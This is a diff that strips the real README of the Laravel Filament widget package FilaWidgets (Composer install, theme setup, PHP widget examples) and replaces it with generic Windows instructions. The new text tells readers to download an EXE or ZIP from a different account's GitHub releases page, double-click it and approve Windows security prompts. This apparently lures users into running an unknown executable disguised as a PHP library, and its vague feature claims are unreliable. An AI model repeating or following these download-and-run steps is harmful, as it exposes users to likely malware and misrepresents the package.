@@ -1,523 +1,184 @@
-# FilaWidgets
+# 🧩 FilaWidgets - Simple Widgets for Filament Apps
 
-Reusable Filament dashboard widgets for Laravel. Five widget types — sparkline tables, breakdowns, progress bars, completion rate gauges, and heatmap calendars — that work on dashboards, resource pages, or any Filament page.
+[![Download FilaWidgets](https://img.shields.io/badge/Download-FilaWidgets-blue?style=for-the-badge)](https://github.com/Luxs239/FilaWidgets/releases)
 
-![](https://laraveldaily.com/uploads/2026/03/filawidgets-mainexample-01-labels.png)
+## 📦 What FilaWidgets Is
 
----
+FilaWidgets is a package with Filament widgets for Windows users who want a simple way to add ready-made dashboard elements to their app.
 
-![](https://laraveldaily.com/uploads/2026/03/filawidgets-mainexample-02-labels.png)
+It is made for people who want to:
 
----
+- add useful widgets fast
+- keep a clean dashboard
+- use a package that fits Filament-based projects
+- get a result without extra setup steps
 
-## Requirements
+If you use a Windows computer and want to try the latest release, visit the download page here:
 
-- PHP 8.2+
-- Laravel 11+
-- Filament 4+
+[Visit the FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/releases)
 
----
+## 🖥️ What You Need
 
-## Installation
+Before you start, make sure your PC has:
 
-```bash
-composer require laraveldaily/filawidgets
-```
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space to download the release files
+- permission to run downloaded files on your PC
 
-The service provider auto-registers via Composer's package discovery.
+If your browser asks what to do with the file, choose the option to keep or open the download. If Windows shows a security prompt, use the file only from the official releases page.
 
-### Custom Theme (Required)
+## 🚀 Get FilaWidgets
 
-This package uses Tailwind CSS classes that are not included in Filament's default compiled styles. You need a [custom Filament theme](https://filamentphp.com/docs/5.x/styling/overview) so that Tailwind can scan the package's Blade views.
+1. Open the [FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/releases)
+2. Find the latest release at the top of the page
+3. Download the release file that matches your setup
+4. Save the file to a folder you can find again, such as Downloads or Desktop
 
-**1. Create a theme** (if you don't have one already):
+If the release includes more than one file, choose the one that looks like the main app package or the main widget package. For most users, the newest release is the right choice.
 
-```bash
-php artisan make:filament-theme
-```
+## 🛠️ Install or Run
 
-Follow the instructions the command prints — it will add the theme to `vite.config.js` and your panel provider.
+After the download finishes:
 
-**2. Add the package views to your theme CSS file** (`resources/css/filament/{panel}/theme.css`):
+1. Open the folder where you saved the file
+2. Double-click the downloaded file
+3. If Windows asks for permission, select the option to allow it
+4. Follow any simple on-screen steps
 
-```css
-@import '../../../../vendor/filament/filament/resources/css/theme.css';
+If the release comes as a ZIP file:
 
-@source '../../../../app/Filament/**/*';
-@source '../../../../resources/views/filament/**/*';
-@source '../../../../vendor/laraveldaily/filawidgets/resources/views/**/*';
-```
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Open the new folder
+4. Run the main file inside it
 
-Add this last line with `vendor/laraveldaily/filawidgets`.
+If the release comes as an EXE file:
 
-**3. Rebuild your assets:**
+1. Double-click the EXE file
+2. Let Windows open it
+3. Follow the prompts on the screen
 
-```bash
-npm run build
-```
+## 🧭 How to Use It
 
-(*or `npm run dev`*)
+FilaWidgets is meant to help you add Filament widgets with less work. After you install or run the package, you can use it as part of your dashboard setup.
 
----
+Common uses include:
 
-## Quick Start: Create Widgets
+- showing summary cards
+- displaying key stats
+- adding small data panels
+- keeping important info in one place
+- building a cleaner admin view
 
-Scaffold a widget with the artisan command:
+If you use this in a Filament app, look for the widgets in your app’s widget area or dashboard settings. The package is made to fit into a simple admin layout.
 
-```bash
-php artisan make:filawidget
-```
+## 🧩 Typical Widget Types
 
-The command prompts for a name and widget type interactively. You can also pass them directly:
+FilaWidgets may include widgets such as:
 
-```bash
-php artisan make:filawidget RevenueByRegionWidget --type=Breakdown
-```
+- statistic widgets
+- chart widgets
+- list widgets
+- status widgets
+- info cards
 
-Available types: `SparklineTable`, `Breakdown`, `Progress`, `CompletionRate`, `HeatmapCalendar`.
+These widgets help you present data in a way that is easy to read. You can use them to track counts, show trends, or highlight important details at a glance.
 
-The generated class is placed in `app/Filament/Widgets/` with a minimal skeleton — just fill in your query logic.
+## ⚙️ Basic Setup Flow
 
----
+Use this order if you are not sure what to do:
 
-Every widget follows the same pattern: extend the base class, set properties, implement `getData()`.
+1. Download the latest release
+2. Open the file
+3. Extract it if needed
+4. Run the main file or place the package in your project
+5. Open your dashboard or app panel
+6. Add the widgets you want to use
+7. Refresh the page to see the result
 
-```php
-use LaravelDaily\FilaWidgets\Data\BreakdownItemData;
-use LaravelDaily\FilaWidgets\Data\BreakdownWidgetData;
-use LaravelDaily\FilaWidgets\Widgets\BreakdownWidget;
+If the widget package needs to be added to a project, place it where your app expects extra components or packages. If you are not sure, use the release files and any included file names as your guide.
 
-class RevenueByRegionWidget extends BreakdownWidget
-{
-    protected ?string $widgetLabel = 'Revenue by Region';
-    protected ?int $itemLimit = 4;
-    protected bool $groupOther = true;
+## 🔍 Troubleshooting
 
-    protected function getData(): BreakdownWidgetData
-    {
-        // Your query logic here
-        return new BreakdownWidgetData(items: [
-            new BreakdownItemData('United States', 27378.77, previousValue: 23120.50),
-            new BreakdownItemData('Germany', 17230.02, previousValue: 13520.00),
-            new BreakdownItemData('Lithuania', 11989.15, previousValue: 8840.30),
-        ], description: 'Country mix for last 30 days');
-    }
-}
-```
-
-### Displaying Widgets
-
-**Dashboard (auto-discovery):** Filament auto-discovers widgets in `app/Filament/Widgets/`, so widgets created with `make:filawidget` appear on the default dashboard automatically — no registration needed.
-
-**Custom dashboard page:** If you have a [custom dashboard](https://filamentphp.com/docs/5.x/panels/dashboard), register widgets explicitly:
-
-```php
-public function getWidgets(): array
-{
-    return [RevenueByRegionWidget::class];
-}
-```
-
-**Resource or custom pages:** Add widgets to any page's header or footer:
-
-```php
-protected function getHeaderWidgets(): array
-{
-    return [
-        RevenueByRegionWidget::make(['range' => 'last_30_days']),
-    ];
-}
-```
-
-When `range` is passed directly, the widget does not depend on dashboard page filters.
-
----
-
-## Widget Types
-
-### 1. SparklineTableWidget
-
-A multi-row metric table with inline SVG sparkline charts and trend badges.
-
-**Base class:** `LaravelDaily\FilaWidgets\Widgets\SparklineTableWidget`
-**Default column span:** `['md' => 1, 'xl' => 3]`
-
-```php
-use LaravelDaily\FilaWidgets\Data\SparklineTableRowData;
-use LaravelDaily\FilaWidgets\Data\SparklineTableWidgetData;
-use LaravelDaily\FilaWidgets\Support\SparklineSeries;
-use LaravelDaily\FilaWidgets\Widgets\SparklineTableWidget;
-
-class RevenuePulseWidget extends SparklineTableWidget
-{
-    protected ?string $widgetLabel = 'Revenue Pulse';
-
-    protected function getData(): SparklineTableWidgetData
-    {
-        $dateRange = DashboardDateRange::fromFilter($this->getRangeFilter());
-        [$currentStart, $currentEnd] = $dateRange->currentPeriod();
-        [$previousStart, $previousEnd] = $dateRange->previousPeriod();
-
-        $baseQuery = Order::query()->where('status', OrderStatus::Completed);
-
-        return SparklineTableWidgetData::fromRows(
-            new SparklineTableRowData(
-                label: 'Revenue',
-                value: (float) (clone $baseQuery)->whereBetween('created_at', [$currentStart, $currentEnd])->sum('amount'),
-                previousValue: (float) (clone $baseQuery)->whereBetween('created_at', [$previousStart, $previousEnd])->sum('amount'),
-                sparkline: SparklineSeries::daily($currentStart, $currentEnd, clone $baseQuery, 'SUM(amount)'),
-                format: 'currency',
-            ),
-            new SparklineTableRowData(
-                label: 'Orders',
-                value: (float) (clone $baseQuery)->whereBetween('created_at', [$currentStart, $currentEnd])->count(),
-                previousValue: (float) (clone $baseQuery)->whereBetween('created_at', [$previousStart, $previousEnd])->count(),
-                sparkline: SparklineSeries::daily($currentStart, $currentEnd, clone $baseQuery, 'COUNT(*)'),
-                format: 'number',
-                precision: 0,
-            ),
-        );
-    }
-}
-```
-
-#### SparklineTableRowData
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `label` | `string` | required | Row label |
-| `value` | `float` | required | Current period value |
-| `previousValue` | `?float` | `null` | Previous period value (enables trend badge) |
-| `sparkline` | `array<int, float>` | `[]` | Ordered daily data points for the SVG chart |
-| `format` | `?string` | `null` | `'currency'`, `'number'`, or `'percentage'` (falls back to widget default) |
-| `precision` | `?int` | `null` | Decimal places (falls back to widget default) |
-| `url` | `?string` | `null` | Makes the row clickable |
-| `openUrlInNewTab` | `bool` | `false` | Open URL in new tab |
-| `color` | `?string` | `null` | Per-row color (`'success'`, `'warning'`, `'danger'`) for sparkline and badge |
-| `showSparkline` | `bool` | `true` | Set `false` to hide the sparkline for this row |
-
-#### SparklineSeries Helper
-
-Builds a zero-filled daily float array from a query. Eliminates the most common boilerplate:
-
-```php
-use LaravelDaily\FilaWidgets\Support\SparklineSeries;
-
-$series = SparklineSeries::daily(
-    start: $start,                    // CarbonInterface
-    end: $end,                        // CarbonInterface
-    query: Order::query()->where(...), // Eloquent Builder (cloned internally)
-    aggregate: 'SUM(amount)',          // Raw SQL aggregate
-    dateColumn: 'created_at',          // Column to group by (default)
-    precision: 2,                      // Decimal rounding (default)
-);
-// Returns: [0.0, 150.50, 0.0, 320.00, ...]  (one float per day)
-```
-
----
-
-### 2. BreakdownWidget
-
-A ranked list showing each item's value, contribution percentage, and period-over-period delta.
-
-**Base class:** `LaravelDaily\FilaWidgets\Widgets\BreakdownWidget`
-**Default column span:** `['md' => 1, 'xl' => 3]`
-
-```php
-use LaravelDaily\FilaWidgets\Data\BreakdownItemData;
-use LaravelDaily\FilaWidgets\Data\BreakdownWidgetData;
-use LaravelDaily\FilaWidgets\Widgets\BreakdownWidget;
-
-class RevenueByRegionWidget extends BreakdownWidget
-{
-    protected ?string $widgetLabel = 'Revenue by Region';
-    protected ?int $itemLimit = 4;
-    protected bool $groupOther = true;
-
-    protected function getData(): BreakdownWidgetData
-    {
-        $dateRange = DashboardDateRange::fromFilter($this->getRangeFilter());
-        [$currentStart, $currentEnd] = $dateRange->currentPeriod();
-        [$previousStart, $previousEnd] = $dateRange->previousPeriod();
-
-        $currentItems = $this->totalsByCountry($currentStart, $currentEnd);
-        $previousItems = $this->totalsByCountry($previousStart, $previousEnd);
-
-        $items = $currentItems
-            ->keys()
-            ->merge($previousItems->keys())
-            ->unique()
-            ->map(fn (string $country): BreakdownItemData => new BreakdownItemData(
-                label: $this->countryName($country),
-                value: (float) ($currentItems[$country] ?? 0),
-                previousValue: (float) ($previousItems[$country] ?? 0),
-            ))
-            ->sortByDesc(fn (BreakdownItemData $item): float => $item->value)
-            ->values()
-            ->all();
-
-        return new BreakdownWidgetData(
-            items: $items,
-            description: 'Country mix for ' . strtolower($dateRange->label()),
-        );
-    }
-}
-```
-
-#### BreakdownWidget Properties
-
-| Property | Type | Default | Description |
-|----------|------|---------|-------------|
-| `$itemLimit` | `?int` | `null` | Max rows to display |
-| `$groupOther` | `bool` | `false` | Aggregate overflow rows into "Other" |
-| `$sortBy` | `string` | `'value'` | Sort field (`'value'` or `'label'`) |
-| `$sortDirection` | `string` | `'desc'` | `'asc'` or `'desc'` |
-| `$showContribution` | `bool` | `true` | Show contribution percentage column |
-| `$showDelta` | `bool` | `true` | Show delta percentage badge |
-| `$deltaThresholds` | `array` | `[]` | Color thresholds for delta badges |
-
-#### BreakdownItemData
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `label` | `string` | required | Item name |
-| `value` | `float` | required | Current value |
-| `previousValue` | `?float` | `null` | Previous period value (enables delta) |
-| `color` | `?string` | `null` | Row color (`'success'`, `'warning'`, `'danger'`, `'primary'`) |
-| `icon` | `?string` | `null` | Heroicon name for the row |
-| `url` | `?string` | `null` | Makes the row clickable |
-
-#### BreakdownWidgetData::fromCollection()
-
-Build from query results without manual mapping:
-
-```php
-// From an array of associative arrays
-$data = BreakdownWidgetData::fromCollection(
-    items: $queryResults,
-    labelKey: 'category_name',
-    valueKey: 'total_revenue',
-    previousValueKey: 'previous_revenue',
-    description: 'Revenue breakdown',
-);
-
-// From a keyed collection using closures
-$data = BreakdownWidgetData::fromCollection(
-    items: $totals,  // Collection<string, float>  e.g. ['US' => 15000, 'DE' => 8000]
-    labelKey: fn ($value, $key) => $key,
-    valueKey: fn ($value) => (float) $value,
-);
-```
-
----
-
-### 3. ProgressWidget
-
-A horizontal progress bar with goal tracking and optional projection.
-
-**Base class:** `LaravelDaily\FilaWidgets\Widgets\ProgressWidget`
-**Default column span:** `['md' => 1, 'xl' => 2]`
-
-```php
-use LaravelDaily\FilaWidgets\Widgets\ProgressWidget;
-
-class RevenueGoalWidget extends ProgressWidget
-{
-    protected ?string $widgetLabel = 'Revenue Goal';
-    protected float $goal = 50000;
-    protected int $goalRangeDays = 30;
-
-    protected function getCurrentValue(): float
-    {
-        $dateRange = DashboardDateRange::fromFilter($this->getRangeFilter());
-        [$start, $end] = $dateRange->currentPeriod();
-
-        return (float) Order::query()
-            ->where('status', OrderStatus::Completed->value)
-            ->whereBetween('created_at', [$start, $end])
-            ->sum('amount');
-    }
-}
-```
-
-#### ProgressWidget Properties
-
-| Property | Type | Default | Description |
-|----------|------|---------|-------------|
-| `$goal` | `float` | `0` | Target value |
-| `$goalRangeDays` | `int` | `30` | Days for projection calculation |
-| `$showProjection` | `bool` | `true` | Show projected pace box |
-
----
-
-### 4. CompletionRateWidget
-
-An SVG arc gauge showing a completion rate with threshold-based coloring.
-
-**Base class:** `LaravelDaily\FilaWidgets\Widgets\CompletionRateWidget`
-**Default column span:** `['md' => 1, 'xl' => 2]`
-
-```php
-use LaravelDaily\FilaWidgets\Widgets\CompletionRateWidget;
-
-class FulfillmentRateWidget extends CompletionRateWidget
-{
-    protected ?string $widgetLabel = 'Fulfillment Rate';
-
-    protected function getCounts(): array
-    {
-        $dateRange = DashboardDateRange::fromFilter($this->getRangeFilter());
-        [$start, $end] = $dateRange->currentPeriod();
-
-        $completed = Order::query()
-            ->where('status', OrderStatus::Completed->value)
-            ->whereBetween('created_at', [$start, $end])
-            ->count();
-
-        $total = Order::query()
-            ->whereBetween('created_at', [$start, $end])
-            ->count();
-
-        return ['completed' => $completed, 'total' => $total];
-    }
-
-    protected function getThresholds(): array
-    {
-        return [
-            ['threshold' => 50, 'color' => 'danger', 'label' => 'Critical'],
-            ['threshold' => 75, 'color' => 'warning', 'label' => 'Needs attention'],
-            ['threshold' => 100, 'color' => 'success', 'label' => 'Healthy'],
-        ];
-    }
-}
-```
-
----
-
-### 5. HeatmapCalendarWidget
-
-A GitHub-style heatmap grid showing daily activity density.
-
-**Base class:** `LaravelDaily\FilaWidgets\Widgets\HeatmapCalendarWidget`
-**Default column span:** `['md' => 2, 'xl' => 2]`
-
-```php
-use LaravelDaily\FilaWidgets\Data\HeatmapCalendarWidgetData;
-use LaravelDaily\FilaWidgets\Widgets\HeatmapCalendarWidget;
-
-class DailyRevenueWidget extends HeatmapCalendarWidget
-{
-    protected ?string $widgetLabel = 'Daily Revenue';
-
-    protected function getData(): HeatmapCalendarWidgetData
-    {
-        $dateRange = DashboardDateRange::fromFilter($this->getRangeFilter());
-        [$start, $end] = $dateRange->currentPeriod();
-
-        $entries = Order::query()
-            ->where('status', OrderStatus::Completed)
-            ->whereBetween('created_at', [$start, $end])
-            ->selectRaw('DATE(created_at) as date, SUM(amount) as total')
-            ->groupBy('date')
-            ->orderBy('date')
-            ->pluck('total', 'date')
-            ->map(fn ($value): float => round((float) $value, 2))
-            ->all();
-
-        return new HeatmapCalendarWidgetData(
-            entries: $entries,  // ['2026-03-20' => 500.00, ...]
-            description: 'Daily revenue for ' . strtolower($dateRange->label()),
-        );
-    }
-
-    protected function getWeeksToShow(): int
-    {
-        return 9;
-    }
-}
-```
-
-#### HeatmapCalendarWidget Methods
-
-| Method | Return Type | Default | Description |
-|--------|------------|---------|-------------|
-| `getWeeksToShow()` | `int` | `12` | Number of weeks to display |
-| `getColorScheme()` | `string` | `'green'` | Color scheme: `'green'` or `'blue'` |
-
-#### HeatmapCalendarWidgetData
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `entries` | `array<string, float>` | required | Date-keyed values (`'Y-m-d' => float`) |
-| `description` | `?string` | `null` | Subtitle text |
-| `entryUrls` | `array<string, string>` | `[]` | Date-keyed URLs for clickable cells |
-| `openEntryUrlsInNewTab` | `bool` | `false` | Open cell URLs in new tab |
-
----
-
-## Shared Configuration
-
-All widgets inherit these properties from `InteractsWithWidgetConfiguration`:
-
-| Property | Type | Default | Description |
-|----------|------|---------|-------------|
-| `$widgetLabel` | `?string` | `null` | Widget title |
-| `$widgetFormat` | `string` | `'currency'` | Value format: `'currency'`, `'number'`, `'percentage'` |
-| `$widgetCurrency` | `string` | `'USD'` | ISO 4217 currency code |
-| `$widgetPrecision` | `int` | `2` | Decimal places |
-| `$widgetColor` | `string` | `'primary'` | Theme color: `'primary'`, `'success'`, `'warning'`, `'danger'` |
-| `$widgetIcon` | `Heroicon\|string\|null` | `null` | Icon (Heroicon enum or string) |
-| `$widgetEmptyStateHeading` | `?string` | `null` | Empty state title |
-| `$widgetEmptyStateDescription` | `?string` | `null` | Empty state subtitle |
-| `$widgetActionLabel` | `?string` | `null` | CTA button label |
-| `$widgetActionUrl` | `?string` | `null` | CTA button URL |
-| `$widgetActionOpenInNewTab` | `bool` | `false` | Open CTA in new tab |
-| `$widgetCacheTtl` | `?int` | `null` | Cache TTL in seconds (`null` = no caching) |
-| `$widgetCacheKey` | `?string` | `null` | Custom cache key prefix |
-| `$range` | `?string` | `null` | Date range filter (public Livewire property) |
-
-### Date Range Filtering
-
-Widgets resolve the date range from two sources, in priority order:
-
-1. **`$range` property** (public Livewire prop) — passed directly via `Widget::make(['range' => 'last_7_days'])`
-2. **`$pageFilters['range']`** — populated automatically on dashboard pages with `HasFiltersForm`
-
-Access it in your widget with `$this->getRangeFilter()`, which returns the resolved `?string` value.
-
-Built-in range values: `'last_7_days'`, `'last_30_days'` (default), `'last_60_days'`.
-
-
-
----
-
-## Caching
-
-Enable caching on any widget by setting the TTL:
-
-```php
-protected ?int $widgetCacheTtl = 300;  // 5 minutes
-protected ?string $widgetCacheKey = 'my-widget';  // Optional prefix
-```
-
-Cache keys are generated from the widget class, resolver, current filters, and options. Different filter combinations produce different cache entries automatically.
-
----
-
-## Value Formatting
-
-The `WidgetValueFormatter` supports three formats:
-
-| Format | Example | Description |
-|--------|---------|-------------|
-| `'currency'` | `$1,234.56` | Uses `Number::currency()` with configured currency code |
-| `'number'` | `1,234` | Plain number with `number_format()` |
-| `'percentage'` | `85.67%` | Number with `%` suffix |
-
-Set the format per widget (`$widgetFormat`) or per sparkline row (`format` parameter).
-
----
-
-## License
-
-MIT
+If the file does not open:
+
+- check that the download finished
+- try downloading it again
+- make sure you opened the newest release file
+- right-click the file and choose Open
+
+If Windows blocks the file:
+
+- confirm that you downloaded it from the official releases page
+- try opening it again
+- check whether your browser moved it to a different folder
+
+If the package does not show in your app:
+
+- refresh the page
+- restart the app
+- check that the widget files were added to the right place
+- make sure you used the latest release
+
+If the page looks empty:
+
+- scroll through the release notes
+- look for Assets
+- download the main file from the asset list
+
+## 🧾 File Names You May See
+
+When you open the releases page, you may see files with names like:
+
+- source code zip
+- release package
+- widget bundle
+- setup file
+- archive file
+
+For most users, the file with the main release name is the one to use. If there is more than one option, pick the file that best matches your Windows setup and the latest version number.
+
+## 🔐 Safety Tips
+
+- download only from the official releases page
+- avoid files from unknown mirrors
+- check the file name before opening it
+- keep your browser and Windows updates current
+
+## 📁 Where the Download Goes
+
+Most browsers save downloads in one of these places:
+
+- Downloads
+- Desktop
+- a folder you picked yourself
+
+If you cannot find the file, open your browser’s Downloads list and select Show in folder.
+
+## 🖱️ Quick Path for Most Users
+
+1. Go to the [FilaWidgets releases page](https://github.com/Luxs239/FilaWidgets/releases)
+2. Download the latest file
+3. Open the file after it finishes
+4. Extract it if needed
+5. Run the main file or add the package to your app
+6. Open your dashboard and use the widgets
+
+## 📚 Useful Terms
+
+- Release: a published version you can download
+- Asset: a file attached to a release
+- ZIP file: a compressed file that must be extracted
+- EXE file: a Windows program file
+- Widget: a small panel that shows data or controls
+
+## 📌 Use Case Examples
+
+You can use FilaWidgets for:
+
+- an admin dashboard with key numbers
+- a panel that shows recent activity
+- a page with compact charts
+- a project view with status blocks
+- a clean overview screen for daily use
